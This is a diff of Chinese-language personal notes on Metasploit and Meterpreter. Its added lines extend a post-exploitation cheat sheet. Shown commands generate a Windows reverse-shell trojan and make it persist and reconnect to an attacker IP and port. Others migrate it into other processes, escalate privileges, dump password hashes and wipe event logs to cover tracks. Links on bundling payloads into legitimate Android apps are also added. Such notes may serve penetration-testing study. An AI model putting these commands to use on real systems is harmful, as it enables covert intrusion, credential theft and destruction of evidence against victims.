@@ -219,7 +219,7 @@ msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows 
 run 
 ```
 - run -j: 背景監聽
-- jobs: 顯示當前上線啟用程序的電腦列表
+- jobs: 顯示當前上線啟用程序的電腦列表(後臺監聽)
 - jobs -h: 操作命令列表
 - session -i (id): 選中操控的電腦(透過id)
 - background/bg: 退出選中回到背景
@@ -229,15 +229,19 @@ run
 - show advanced: 顯示高級指令
 - 第一次連線完成後: 出現 meterpreter > 後執行以下指令
 ```cmd
-run persistence -X
+run persistence -X -i 5 -p 4444 -r (ip)
 ```
 - -X: 開機後自動啟動木馬
 - -i: 目標每隔幾秒自動連線
+- -p: 自動連接的監聽端口
+- -r: 自動連接到的監聽IP
 
 ## 連線後操作
 - help: 列出全部操作指令
 - getsystem: 提權 / rev2self: 改回使用者權限
     - run post/windows/gather/hashdump: dump該裝置目前使用者權限以及密碼 hash值
+- ps: 顯示當前目標正在執行的進程
+- migrate (PID): 將木馬轉移至PID進程
 - 離開操作前記得把日誌刪掉: clearev 指令
 - portfwd: 端口轉發，將目標機台的某個端口轉到其他設備端口連接
 
@@ -247,4 +251,19 @@ run persistence -X
 
 ## 參考資料: 
 - https://www.youtube.com/playlist?list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5
+
+- android 14+ apk綑綁: https://medium.com/@elijahchimera01/embedding-metasploit-payloads-into-legit-android-apps-ad75ab6199c6
+
+- 安裝 apktool 最新版本: https://www.youtube.com/watch?v=adwFmvzM2iQ 
+
+## MSF漏洞掃描
+1. search (naem): 搜尋漏洞名稱
+2. use (name): 使用該漏洞
+3. show options & set: 設置漏洞必要參數
+4. check: 確認目標是否存在該漏洞
+4. run
+
+### stage & stager
+- https://www.youtube.com/watch?v=F1EmVLmDIcc&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=21
+
 
